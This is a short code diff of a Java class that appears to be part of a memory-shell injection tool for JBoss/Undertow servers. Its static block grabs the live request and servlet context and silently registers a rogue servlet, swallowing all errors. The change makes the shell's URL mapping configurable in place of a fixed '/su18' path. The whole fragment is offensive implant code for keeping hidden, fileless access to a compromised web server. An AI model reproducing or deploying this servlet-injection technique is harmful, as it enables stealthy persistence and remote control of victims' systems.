@@ -19,10 +19,11 @@ import java.util.Map;
  */
 public class JBSMSFromContext implements Servlet {
 
+	public static String pattern;
+
 	static {
 		try {
 			String servletName = "su18" + System.nanoTime();
-			String urlPattern  = "/su18";
 
 			HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
 			ServletContext         context = request.getServletContext();
@@ -47,7 +48,7 @@ public class JBSMSFromContext implements Servlet {
 				ServletHandler handler    = deployment.getServlets().addServlet(servletInfo);
 
 				ServletRegistrationImpl registration = new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
-				registration.addMapping(urlPattern);
+				registration.addMapping(pattern);
 			}
 		} catch (Exception ignored) {
 		}
